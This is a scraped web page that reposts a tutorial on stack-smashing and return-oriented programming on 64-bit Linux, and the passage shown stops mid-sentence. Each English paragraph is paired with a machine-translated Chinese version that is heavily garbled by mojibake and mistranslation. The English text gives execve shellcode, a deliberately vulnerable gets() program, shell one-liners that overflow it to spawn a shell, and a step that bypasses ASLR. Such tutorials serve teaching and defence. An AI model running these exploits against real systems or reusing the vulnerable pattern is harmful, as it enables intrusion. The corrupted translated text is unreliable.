<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>64ä½Linuxé¢å‘è¿”å›çš„ç¼–ç¨‹ 64-Bit Linux Return-Oriented Programming</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">64-Bit Linux Return-Oriented Programming<br/>64ä½Linuxé¢å‘è¿”å›çš„ç¼–ç¨‹ </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-03-24 02:27:53</div><div class="page_narrow text-break page_content"><p>Update:  Dongli Zhang reports that newer Linux versions organize the stack differently. The code below will need to be modified accordingly.</p><p>æ›´æ–°ï¼šDongli ZhangæŠ¥å‘Šè¾ƒæ–°çš„Linuxç‰ˆæœ¬ä»¥ä¸åŒçš„æ–¹å¼ç»„ç»‡å †æ ˆã€‚ä¸‹é¢çš„ä»£ç éœ€è¦ç›¸åº”ä¿®æ”¹ã€‚</p><p> Nobodyâ€™s perfect. Particularly not programmers. Some days, we spend half ourtime fixing mistakes we made in the other half. And thatâ€™s when weâ€™re lucky:often, a subtle bug escapes unnoticed into the wild, and we only learn of itafter a monumental catastrophe.</p><p> æ²¡æœ‰äººæ˜¯å®Œç¾çš„ã€‚ç‰¹åˆ«ä¸æ˜¯ç¨‹åºå‘˜ã€‚æœ‰äº›æ—¥å­ï¼Œæˆ‘ä»¬èŠ±äº†ä¸€åŠçš„æ—¶é—´æˆ‘ä»¬åœ¨å¦ä¸€åŠåˆ¶ä½œçš„é”™è¯¯ã€‚é‚£å°±æ˜¯æˆ‘ä»¬å¹¸è¿çš„æ—¶å€™ï¼šç»å¸¸ï¼Œä¸€ä¸ªå¾®å¦™çš„è™«å­è¢«å˜²ç¬‘è¿›å…¥é‡å¤–ï¼Œæˆ‘ä»¬åªå­¦ä¹ æ˜“ç¢çš„å·¨å¤§ç¾éš¾ã€‚</p><p> Some disasters are accidental. For example, an unlucky chain of events mightresult in the precise conditions needed to trigger an overlooked logic error.Other disasters are deliberate. Like an accountant abusing a tax loopholelurking in a labyrinth of complex rules, an attacker might discover a bug,then exploit it to take over many computers.</p><p> ä¸€äº›ç¾éš¾æ˜¯å¶ç„¶çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨è§¦å‘è¢«å¿½è§†çš„é€»è¾‘é”™è¯¯æ‰€éœ€çš„ç²¾ç¡®æ¡ä»¶ä¸‹ï¼ŒMightresultçš„ä¸å¹¸äº‹ä»¶è¿é”æœ¯ä¸­å¯èƒ½æ˜¯æ•…æ„çš„ã€‚å°±åƒåœ¨å¤æ‚è§„åˆ™çš„è¿·å®«ä¸­æ»¥ç”¨ç¨æ”¶æ¼æ´çš„ä¼šè®¡å¸ˆä¸€æ ·ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå‘ç°ä¸€ä¸ªé”™è¯¯ï¼Œç„¶ååˆ©ç”¨å®ƒæ¥ç®¡è®¸å¤šè®¡ç®—æœºã€‚</p><p> Accordingly, modern systems are replete with security features designed toprevent evildoers from exploiting bugs. These safeguards might, for instance,hide vital information, or halt execution of a program as soon as they detectanomalous behaviour.</p><p> å› æ­¤ï¼Œç°ä»£ç³»ç»Ÿä¸å®‰å…¨åŠŸèƒ½ä¸ºè®¾è®¡çš„è¶…çº§æ³„éœ²è€…æä¾›çš„å®‰å…¨åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œè¿™äº›ä¿éšœæªæ–½å¯èƒ½ä¼šéšè—é‡è¦ä¿¡æ¯ï¼Œæˆ–è€…åœ¨æ£€æµ‹æœºæ„è¡Œä¸ºåç«‹å³åœæ­¢æ‰§è¡Œç¨‹åºã€‚</p><p> Executable space protection is one such defence. Unfortunately, it is anineffective defence. In this guide, we show how to circumvent executable spaceprotection on 64-bit Linux using a technique known as return-orientedprogramming.</p><p> å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤æ˜¯ä¸€ä¸ªè¿™æ ·çš„é˜²å¾¡ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå®ƒæ˜¯æ”»å‡»æ€§çš„é˜²å¾¡ã€‚åœ¨æœ¬æŒ‡å—ä¸­ï¼Œæˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç§°ä¸ºReturnieDrogrammingçš„æŠ€æœ¯æ¥æ—¨åœ¨å°†å¯æ‰§è¡Œçš„SpaceProtè°ƒæ•´ä¸º64ä½Linuxã€‚</p><p> We begin our journey by writing assembly to launch a shell via the execvesystem call.</p><p> æˆ‘ä»¬å¼€å§‹é€šè¿‡ç¼–å†™ç¨‹åºé›†é€šè¿‡execvesystemè°ƒç”¨æ¥å¯åŠ¨shellçš„æ—…ç¨‹ã€‚</p><p> For backwards compatibility, 32-bit Linux system calls are supported in 64-bitLinux, so we might think we can reuse shellcode targeted for 32-bit systems.However, the execve syscall takes a memory address holding the NUL-terminatedname of the program that should be executed. Our shellcode might be injectedsomeplace that requires us to refer to memory addresses larger than 32 bits.Thus we must use 64-bit system calls.</p><p> å¯¹äºå‘åå…¼å®¹æ€§ï¼Œ64-Bitlinuxæ”¯æŒ32ä½Linuxç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯èƒ½ä¼šè®¤ä¸ºæˆ‘ä»¬å¯ä»¥é‡ç”¨é’ˆå¯¹32ä½ç³»ç»Ÿçš„ShellCodeã€‚ä½†æ˜¯ï¼ŒEXECVE SYSCALLå æ®ç¨‹åºçš„NUL-TRADIDINGNAMEçš„å†…å­˜åœ°å€åº”è¯¥è¢«æ‰§è¡Œã€‚æˆ‘ä»¬çš„shellcodeå¯èƒ½ä¼šæ³¨å…¥ä¸€ä¸‹ï¼Œè¦æ±‚æˆ‘ä»¬å¼•ç”¨å¤§äº32ä½çš„å†…å­˜åœ°å€.Thusæˆ‘ä»¬å¿…é¡»ä½¿ç”¨64ä½ç³»ç»Ÿè°ƒç”¨ã€‚ </p><p>    int main() { asm(&#34;\needle0: jmp there\n\here: pop %rdi\n\ xor %rax, %rax\n\ movb $0x3b, %al\n\ xor %rsi, %rsi\n\ xor %rdx, %rdx\n\ syscall\n\there: call here\n\.string \&#34;/bin/sh\&#34;\n\needle1: .octa 0xdeadbeef\n\ &#34;);}</p><p>int mainï¼ˆï¼‰{asmï¼ˆï¼†ï¼ƒ34; \ needle0ï¼šjmp with \ n \ ni neï¼špopï¼…rdi \ n \ xorï¼…raxï¼Œï¼…rax \ n \ movb $ 0x3bï¼Œï¼…al \ n \ xorï¼…RSIï¼Œï¼… RSI \ n \ xorï¼…rdxï¼Œï¼…rdx \ n \ syscall \ n \ n \ withï¼šå‘¼å«è¿™é‡Œ\ n \ .string \ï¼†ï¼ƒ34; / bin / sh \ï¼†ï¼ƒ34; \ n \ preedle1ï¼š.octa 0xdeadbeef \ n \ï¼†ï¼ƒ34;ï¼‰;}</p><p> No matter where in memory our code winds up, the call-pop trick willload the RDI register with the address of the &#34;/bin/sh&#34; string.</p><p> æ— è®ºåœ¨å†…å­˜æˆ‘ä»¬çš„ä»£ç æ—¶ï¼ŒCall-PopæŠ€å·§ä¼šå°†RDIæ³¨å†Œåˆ°ï¼†ï¼ƒ34; / bin / shï¼†ï¼ƒ34çš„åœ°å€;ç»†ç»³ã€‚</p><p> The  needle0 and  needle1 labels are to aid searches later on; so is the 0xdeadbeef constant (though since x86 is little-endian, it will show up as EF BE AD DE followed by 4 zero bytes).</p><p> é’ˆå¤´0å’Œé’ˆ1æ ‡ç­¾æ˜¯ç¨åæœ‰åŠ©äºæœç´¢;æ‰€ä»¥0xDeadBeefå¸¸æ•°æ˜¯ï¼ˆè™½ç„¶x86æ˜¯å°endianï¼Œä½†å®ƒå°†æ˜¾ç¤ºä¸ºefä¸ºad deï¼Œåè·Ÿ4ä¸ªé›¶å­—èŠ‚ï¼‰ã€‚</p><p> For simplicity, weâ€™re using the API incorrectly; the second and third argumentsto execve are supposed to point to NULL-terminated arrays of pointers tostrings (argv[] and envp[]). However, our system is forgiving: running&#34;/bin/sh&#34; with NULL argv and envp succeeds:</p><p> ä¸ºç®€å•èµ·è§ï¼Œæˆ‘ä»¬ä¸æ­£ç¡®åœ°ä½¿ç”¨APIâ€‹â€‹;ç¬¬äºŒå’Œç¬¬ä¸‰areguctstoæ‰§è¡Œåº”è¯¥æŒ‡å‘NULLç»ˆæ­¢æŒ‡é’ˆToSâ€‹â€‹tringsé˜µåˆ—ï¼ˆargv []å’Œenvp []ï¼‰ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿå®½æ•ï¼šè¿è¡Œï¼†ï¼ƒ34; / bin / shï¼†ï¼ƒ34; null argvå’ŒenvpæˆåŠŸï¼š</p><p> $ objdump -d a.out | sed -n &#39;/needle0/,/needle1/p&#39;00000000004004bf &lt;needle0&gt;: 4004bf: eb 0e jmp 4004cf &lt;there&gt;00000000004004c1 &lt;here&gt;: 4004c1: 5f pop %rdi 4004c2: 48 31 c0 xor %rax,%rax 4004c5: b0 3b mov $0x3b,%al 4004c7: 48 31 f6 xor %rsi,%rsi 4004ca: 48 31 d2 xor %rdx,%rdx 4004cd: 0f 05 syscall00000000004004cf &lt;there&gt;: 4004cf: e8 ed ff ff ff callq 4004c1 &lt;here&gt; 4004d4: 2f (bad) 4004d5: 62 (bad) 4004d6: 69 6e 2f 73 68 00 ef imul $0xef006873,0x2f(%rsi),%ebp00000000004004dc &lt;needle1&gt;:</p><p> $ objdump -d a.out | SED -Nï¼†ï¼ƒ39; /é’ˆ0 /ï¼Œ/é’ˆå¤´1 / Pï¼†ï¼ƒ39; 00000000004004BFï¼†lt;é’ˆ0ï¼†gt ;: 4004bfï¼šEB 0e 2 4004cfï¼†lt;è¿™é‡Œï¼†gt ;: 4004c1ï¼š5f popï¼…rdi 4004c2ï¼š48 31 C0 XORï¼…raxï¼Œï¼…rax 4004c5ï¼šb0 3b mov $ 0x3bï¼Œï¼…al 4004c7ï¼š48 31 f6 xorï¼…RSIï¼Œï¼…RSI 4004caï¼š48 31d2 XORï¼…RDXï¼Œï¼…RDX 4004CDï¼š0F 05 SYSCALL0000000000004004CFï¼†LT;å…¶ä¸­ï¼†gt ;: 4004CF ï¼šE8 ED FF FF FF CALLQ 4004C1ï¼†LT;æ­¤å¤„ï¼†gt; 4004D4ï¼š2Fï¼ˆåï¼‰4004D5ï¼š62ï¼ˆåï¼‰4004D6ï¼š69 6E 2F 73 68 00 EF IMUL $ 0xEF006873,0x2Fï¼ˆï¼…RSIï¼‰ï¼Œï¼…EBP00000000004004DCï¼†lt;é’ˆ1ï¼†gt ;:</p><p> On 64-bit systems, the code segment is usually placed at 0x400000,so in the binary, our code lies starts at offset 0x4bf and finishes right beforeoffset 0x4dc. This is 29 bytes:</p><p> åœ¨64ä½ç³»ç»Ÿä¸Šï¼Œä»£ç æ®µé€šå¸¸ä½äº0x400000ï¼Œå› æ­¤åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬çš„ä»£ç åœ¨åç§»0x4bfä»¥åç§»0x4bfå¼€å§‹ï¼Œå¹¶åœ¨Offoffset 0x4DCä¹‹å‰å®Œæˆã€‚è¿™æ˜¯29ä¸ªå­—èŠ‚ï¼š</p><p>  We round this up to the next multiple of 8 to get 32, then run:</p><p>  æˆ‘ä»¬å°†æ­¤è¾¾åˆ°ä¸‹ä¸€ä¸ªå€æ•°ä¸º8ä»¥è·å¾—32ï¼Œç„¶åè¿è¡Œï¼š </p><p> #include &lt;stdio.h&gt;int main() { char name[64]; puts(&#34;What&#39;s your name?&#34;); gets(name); printf(&#34;Hello, %s!\n&#34;, name); return 0;}</p><p>#includeï¼†lt; stdio.hï¼†gt; int mainï¼ˆï¼‰{char name [64];æ”¾ï¼ˆï¼†ï¼ƒ34;ä»€ä¹ˆï¼†ï¼ƒ39;ä½ çš„åå­—ï¼Ÿï¼†ï¼ƒ34;ï¼‰;å¾—åˆ°ï¼ˆå§“åï¼‰; printfï¼ˆï¼†ï¼ƒ34; helloï¼Œï¼…sï¼\ nï¼†ï¼ƒ34;ï¼Œå§“åï¼‰;è¿”å›0;}</p><p> Thanks to the cdecl calling convention for x86 systems, if we input a reallylong string, weâ€™ll overflow the  name buffer, and overwrite the returnaddress. Enter the shellcode followed by the right bytes and the program willunwittingly run it when trying to return from the main function.</p><p> ç”±äºX86ç³»ç»Ÿçš„CDECLå‘¼å«çº¦å®šï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªçœŸæ­£çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°†æº¢å‡ºåç§°ç¼“å†²åŒºï¼Œå¹¶è¦†ç›–returnaddressã€‚è¾“å…¥shellcodeåè·Ÿå³å­—èŠ‚ï¼Œç¨‹åºåœ¨å°è¯•ä»ä¸»è¦åŠŸèƒ½è¿”å›æ—¶è¿è¡Œå®ƒã€‚</p><p> Alas, stack smashing is much harder these days.On my stock Ubuntu 12.04 install, there are 3 countermeasures:</p><p> å”‰ï¼Œå †æ ˆç²‰ç¢è¿™äº›æ—¶ä»£æ›´éš¾ã€‚æˆ‘çš„è‚¡ç¥¨Ubuntu 12.04å®‰è£…ï¼Œæœ‰3ä¸ªå¯¹ç­–ï¼š</p><p> GCC Stack-Smashing Protector (SSP), aka ProPolice: the compiler rearranges the stack layout to make buffer overflows less dangerous and inserts runtime stack integrity checks.</p><p> GCC Stack-Smashing Protectorï¼ˆSSPï¼‰ï¼ŒAKA Propoliceï¼šç¼–è¯‘å™¨é‡æ–°æ’åˆ—å †æ ˆå¸ƒå±€ï¼Œä½¿ç¼“å†²åŒºæº¢å‡ºè¾ƒå°‘å±é™©å¹¶æ’å…¥è¿è¡Œæ—¶å †æ ˆå®Œæ•´æ€§æ£€æŸ¥ã€‚</p><p> Executable space protection (NX): attempting to execute code in the stack causes a segmentation fault. This feature goes by many names, e.g. Data Execution Prevention (DEP) on Windows, or Write XOR Execute (W^X) on BSD. We call it NX here, because 64-bit Linux implements this feature with the CPUâ€™s NX bit (&#34;Never eXecute&#34;).</p><p> å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤ï¼ˆNXï¼‰ï¼šå°è¯•åœ¨å †æ ˆä¸­æ‰§è¡Œä»£ç ä¼šå¯¼è‡´åˆ†æ®µé”™è¯¯ã€‚è¿™é¡¹åŠŸèƒ½é€šè¿‡è®¸å¤šåç§°ï¼Œä¾‹å¦‚ï¼Œ Windowsä¸Šçš„æ•°æ®æ‰§è¡Œé¢„é˜²ï¼ˆDEPï¼‰ï¼Œæˆ–åœ¨BSDä¸Šå†™å…¥XORæ‰§è¡Œï¼ˆW ^ xï¼‰ã€‚æˆ‘ä»¬åœ¨æ­¤å¤„è°ƒç”¨å®ƒï¼Œå› ä¸º64ä½Linuxä½¿ç”¨CPUçš„NXä½ï¼ˆï¼†ï¼ƒ34;åˆ‡å‹¿æ‰§è¡Œï¼†ï¼ƒ34;ï¼‰å®ç°æ­¤åŠŸèƒ½ã€‚</p><p> Address Space Layout Randomization (ASLR): the location of the stack is randomized every run, so even if we can overwrite the return address, we have no idea what to put there.</p><p> åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ï¼šå †æ ˆçš„ä½ç½®æ¯æ¬¡è¿è¡Œéƒ½éšæœºåŒ–ï¼Œå› æ­¤å³ä½¿æˆ‘ä»¬å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œæˆ‘ä»¬ä¹Ÿä¸çŸ¥é“å°†å…¶æ”¾åœ¨é‚£é‡Œã€‚</p><p>        #include &lt;stdio.h&gt;int main() { char name[64]; printf(&#34;%p\n&#34;, name); // Print address of buffer. puts(&#34;What&#39;s your name?&#34;); gets(name); printf(&#34;Hello, %s!\n&#34;, name); return 0;}</p><p>        #includeï¼†lt; stdio.hï¼†gt; int mainï¼ˆï¼‰{char name [64]; printfï¼ˆï¼†ï¼ƒ34;ï¼…p \ nï¼†ï¼ƒ34;åç§°ï¼‰; //æ‰“å°ç¼“å†²åŒºåœ°å€ã€‚æ”¾ï¼ˆï¼†ï¼ƒ34;ä»€ä¹ˆï¼†ï¼ƒ39;ä½ çš„åå­—ï¼Ÿï¼†ï¼ƒ34;ï¼‰;å¾—åˆ°ï¼ˆå§“åï¼‰; printfï¼ˆï¼†ï¼ƒ34; helloï¼Œï¼…sï¼\ nï¼†ï¼ƒ34;ï¼Œå§“åï¼‰;è¿”å›0;} </p><p> $ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;cat ) | setarch `arch` -R ./victim</p><p>$ï¼ˆï¼ˆcat shellcode; printfï¼…080d 0; echo $ aï¼‰| xxd -r -p; catï¼‰| setarch` arch` -r ./victim</p><p> The shellcode takes up the first 32 bytes of the buffer. The 80 zeroes in theprintf represent 40 zero bytes, 32 of which fill the rest of the buffer, andthe remaining 8 overwrite the saved location of the RBP register. The next 8overwrite the return address, and point to the beginning of the buffer whereour shellcode lies.</p><p> shellcodeå ç”¨ç¼“å†²åŒºçš„å‰32ä¸ªå­—èŠ‚ã€‚ ThePrintFä¸­çš„80ä¸ªé›¶ä»£è¡¨40ä¸ªé›¶å­—èŠ‚ï¼Œå…¶ä¸­32ä¸ªå¡«å……ç¼“å†²åŒºçš„å…¶ä½™éƒ¨åˆ†ï¼Œå¹¶ä¸”å…¶ä½™8è¦†ç›–RBPå¯„å­˜å™¨çš„ä¿å­˜ä½ç½®ã€‚æ¥ä¸‹æ¥çš„8 overwriteè¿”å›åœ°å€ï¼Œå¹¶æŒ‡å‘ç¼“å†²åŒºçš„å¼€å¤´ï¼Œä»ä½•å¤„shellcodeè°è¨€ã€‚</p><p> Hit Enter a few times, then type &#34;ls&#34; to confirm that we are indeed ina running shell. There is no prompt, because the standard input is provided by cat, and not the terminal ( /dev/tty).</p><p> ç‚¹å‡»å‡ æ¬¡ï¼Œç„¶åè¾“å…¥ï¼†ï¼ƒ34; lsï¼†ï¼ƒ34;ç¡®è®¤æˆ‘ä»¬ç¡®å®æ˜¯inaè¿è¡Œçš„shellã€‚æ²¡æœ‰æç¤ºï¼Œå› ä¸ºæ ‡å‡†è¾“å…¥ç”±CATæä¾›ï¼Œè€Œä¸æ˜¯ç»ˆç«¯ï¼ˆ/ dev / ttyï¼‰æä¾›ã€‚</p><p> Just for fun, weâ€™ll take a detour and look into ASLR. In the old days, youcould read the ESP register of any process by looking at  /proc/pid/stat. Thisleak was plugged long ago. (Nowadays, a process can spy on a given process onlyif it has permission to ptrace() it.)</p><p> åªæ˜¯ä¸ºäº†å¥½ç©ï¼Œæˆ‘ä»¬ä¼šç»•é“è€Œè¡Œå¹¶æŸ¥çœ‹ASLRã€‚åœ¨è¿‡å»ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹/ proc / pid / stalæ¥é˜…è¯»ä»»ä½•è¿›ç¨‹çš„ESPæ³¨å†Œã€‚ Thisleakå¾ˆä¹…ä»¥å‰æ’äº†ã€‚ ï¼ˆå¦‚ä»Šï¼Œä¸€ä¸ªè¿‡ç¨‹å¯ä»¥åœ¨çº¯ç²¹çš„è¿‡ç¨‹ä¸Šé—´è°ï¼Œå¦åˆ™å®ƒæœ‰æƒå…è®¸Ptraceï¼ˆï¼‰ã€‚ï¼‰</p><p> Letâ€™s pretend weâ€™re on an unpatched system, as itâ€™s more satisfying to cheatless. Also, we see first-hand the importance of being patched, and why ASLRneeds secrecy as well as randomness.</p><p> è®©æˆ‘ä»¬å‡è£…æˆ‘ä»¬åœ¨ä¸€ä¸ªæœªè¢«æ·˜æ±°çš„ç³»ç»Ÿä¸Šï¼Œå› ä¸ºå®ƒæ›´åŠ ä»¤äººæ»¡æ„è€Œä¸ç¦æ­¢ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬çœ‹åˆ°é¦–å…ˆæ˜¯è¢«ä¿®è¡¥çš„é‡è¦æ€§ï¼Œä»¥åŠä¸ºä»€ä¹ˆaslrneedsä¿å¯†ä»¥åŠéšæœºæ€§ã€‚</p><p>       Thus while the victim program is waiting for user input, itâ€™s stack pointeris 0x7fffffe038. We calculate the distance from this pointer to the namebuffer:</p><p>       å› æ­¤ï¼Œè™½ç„¶å—å®³è€…ç¨‹åºæ­£åœ¨ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œä½†å®ƒæ˜¯Stack Pointeris 0x7FFFFFE038ã€‚æˆ‘ä»¬è®¡ç®—ä¸è¯¥æŒ‡é’ˆåˆ°NameBufferçš„è·ç¦»ï¼š</p><p>  We are now armed with the offset we need to defeat ASLR on older systems.After running the victim program with ASLR reenabled:</p><p>  æˆ‘ä»¬ç°åœ¨æ­¦è£…åç§»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ—§ç³»ç»Ÿä¸Šå‡»è´¥ASLRã€‚ä½¿ç”¨ASLRé‡æ–°å¯ç”¨è¿è¡Œå—å®³è€…ç¨‹åºï¼š </p><p>       $ sp=`ps --no-header -C victim -o esp`$ a=`printf %016x $((0x7fff$sp+88)) | tac -r -s..`$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ;cat ) &gt; pip</p><p>$ sp =`ps  -  no-header -c progrest -o esp` $ a =`printfï¼…016x $ï¼ˆï¼ˆ0x7fff $ sp + 88ï¼‰ï¼‰| TAC -R -S..` $ï¼ˆï¼ˆcat shellcode; printfï¼…080d 0;å›å£°$ aï¼‰| xxd -r -p; catï¼‰ï¼†gt; pip</p><p> Recompile the victim program without running the execstack command.Alternatively, reactivate executable space protection by running:</p><p> é‡æ–°ç¼–è¯‘å—å®³è€…ç¨‹åºè€Œä¸è¿è¡Œexecstackå‘½ä»¤ã€‚é€šè¿‡è¿è¡Œï¼Œé‡æ–°æ¿€æ´»å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤ï¼š</p><p>  Try attacking this binary as above. Our efforts are thwarted as soon as theprogram jumps to our injected shellcode in the stack. The whole area is markednonexecutable, so we get shut down.</p><p>  å°è¯•å¦‚ä¸Šæ‰€è¿°æ”»å‡»æ­¤äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æˆ‘ä»¬çš„åŠªåŠ›è¢«æŒ«è´¥äº†ï¼Œåªè¦Propramè·³åˆ°äº†å †æ ˆä¸­çš„æ³¨å…¥çš„shellcodeã€‚æ•´ä¸ªåŒºåŸŸéƒ½è¢«æ ‡è®°ä¸ºnonexecutableï¼Œæ‰€ä»¥æˆ‘ä»¬è¢«å…³é—­äº†ã€‚</p><p> Return-oriented programming deftly sidesteps this defence. The classic bufferoverflow exploit fills the buffer with code we want to run; return-orientedprogramming instead fills the buffer with  addresses of snippets of code wewant to run, turning the stack pointer into a sort of indirect instructionpointer.</p><p> ä»¥è¿”å›è¿”å›çš„ç¼–ç¨‹çµå·§åœ°åä¿¡è¿™ç§é˜²å¾¡ã€‚ç»å…¸çš„bufferoverflow inspoitç”¨æˆ‘ä»¬æƒ³è¦è¿è¡Œçš„ä»£ç å¡«å……ç¼“å†²åŒº; Return-OrientEdProgrammentï¼ˆRESOREDPRAGGUMMINGï¼‰å¡«å……äº†å¸¦æœ‰ä»£ç ç»œéƒ¨ç‰‡æ®µçš„åœ°å€çš„ç¼“å†²åŒºæ¥è¿è¡Œï¼Œå°†å †æ ˆæŒ‡é’ˆè½¬æ¢ä¸ºä¸€ç§é—´æ¥çš„æŒ‡ä»¤ç‚¹ã€‚</p><p> The snippets of code are handpicked from executable memory: for example, theymight be fragments of libc. Hence the NX bit is powerless to stop us.In more detail:</p><p> ä»£ç ç‰‡æ®µä»å¯æ‰§è¡Œå†…å­˜ä¸­å¤„ç†ï¼šä¾‹å¦‚ï¼Œå®ƒä»¬æ˜¯libcçš„ç¢ç‰‡ã€‚å› æ­¤ï¼ŒNXä½æ— åŠ›é˜»æ­¢æˆ‘ä»¬ã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼š</p><p> We start with SP pointing to the start of a series of addresses. A RET instruction kicks things off.</p><p> æˆ‘ä»¬ä»SPå¼€å§‹æŒ‡å‘ä¸€ç³»åˆ—åœ°å€çš„å¼€å§‹ã€‚ RETæŒ‡ä»¤è¸¢æ‰äº†ä¸œè¥¿ã€‚</p><p> Forget RETâ€™s usual meaning of returning from a subroutine. Instead, focus on its effects: RET jumps to the address in the memory location held by SP, and increments SP by 8 (on a 64-bit system).</p><p> å¿˜è®°ä»å­ç¨‹åºè¿”å›çš„é€šå¸¸å«ä¹‰ã€‚ç›¸åï¼Œå…³æ³¨å…¶å½±å“ï¼šRetè·³è½¬åˆ°SPä¿æŒçš„å†…å­˜ä½ç½®çš„åœ°å€ï¼Œå¹¶é€’å¢8ï¼ˆåœ¨64ä½ç³»ç»Ÿä¸Šï¼‰ã€‚ </p><p> Our mission is to call the libc system() function with &#34;/bin/sh&#34; as theargument. We can do this by calling a gadget that assigns a chosen value toRDI and then jump to the system() libc function.</p><p>æˆ‘ä»¬çš„ä½¿å‘½æ˜¯ç”¨ï¼†ï¼ƒ34è‡´ç”µLibcç³»ç»Ÿï¼ˆï¼‰å‡½æ•°; / bin / shï¼†ï¼ƒ34;ä½œä¸ºæ†å¤´ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨åˆ†é…æ‰€é€‰å€¼tordiçš„å°å·¥å…·æ¥æ‰§è¡Œæ­¤æ“ä½œï¼Œç„¶åè·³è½¬åˆ°ç³»ç»Ÿï¼ˆï¼‰libcå‡½æ•°ã€‚</p><p>   My system has a 32-bit and a 64-bit libc. We want the 64-bit one; thatâ€™s thesecond on the list.</p><p>   æˆ‘çš„ç³»ç»Ÿæœ‰ä¸€ä¸ª32ä½å’Œ64ä½libcã€‚æˆ‘ä»¬æƒ³è¦64ä½;è¿™æ˜¯åˆ—è¡¨ä¸­çš„é‚£é›¶ã€‚</p><p>      while the pointer to &#34;/bin/sh&#34; is at the top of the stack. This would assignthe pointer to RDI before advancing the stack pointer.The corresponding machine code is the two-byte sequence  0x5f 0xc3, whichought to occur somewhere in libc.</p><p>      è™½ç„¶æŒ‡é’ˆåˆ°ï¼†ï¼ƒ34; / bin / shï¼†ï¼ƒ34;ä½äºå †æ ˆçš„é¡¶éƒ¨ã€‚è¿™å°†åœ¨æ¨è¿›å †æ ˆæŒ‡é’ˆä¹‹å‰å°†æŒ‡é’ˆæŒ‡å‘åˆ°RDIã€‚ç›¸åº”çš„æœºå™¨ä»£ç æ˜¯ä¸¤ä¸ªå­—èŠ‚åºåˆ—0x5f 0xC3ï¼Œå…¶åœ¨Libcä¸­çš„æŸå¤„å‘ç”Ÿã€‚</p><p> Sadly, I know of no widespread Linux tool that searches a file for a givensequence of bytes; most tools seem oriented towards text files and expect theirinputs to be organized with newlines. (Iâ€™m reminded of Rob Pikeâ€™s&#34; Structural RegularExpressions&#34;.)</p><p> å¯æ‚²çš„æ˜¯ï¼Œæˆ‘çŸ¥é“æ²¡æœ‰å¹¿æ³›çš„Linuxå·¥å…·ï¼Œå¯ä»¥æœç´¢ä¸€ä¸ªæ–‡ä»¶çš„ä¸€ä¸ªæ–‡ä»¶çš„ä¸€ä¸ªå­—èŠ‚;å¤§å¤šæ•°å·¥å…·ä¼¼ä¹é¢å‘æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶æœŸæœ›ä»–ä»¬çš„çº½æ‰£ç»„ç»‡ã€‚ ï¼ˆæˆ‘æé†’æŠ¢åŠ«æ´¾å…‹çš„ï¼†ï¼ƒ34;ç»“æ„è§„èŒƒæŠ‘åˆ¶ï¼†ï¼ƒ34;ï¼‰</p><p>  $ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 |grep 5f -m1 | awk &#39;{printf&#34;%x\n&#34;,$1-1}&#39;22a12</p><p>  $ xxd -c1 -p /llib/x86_64-linux-gnu/libc.so.6 | grep-n -b1 c3 | grep 5f-m1 | awkï¼†ï¼ƒ39; {printfï¼†ï¼ƒ34;ï¼…x \ nï¼†ï¼ƒ34;ï¼Œ$ 1-1}ï¼†ï¼ƒ39; 22a12</p><p>  Look for &#34;c3&#34;, and print one line of leading context along with the matches. We also print the line numbers.</p><p>  å¯»æ‰¾ï¼†ï¼ƒ34; 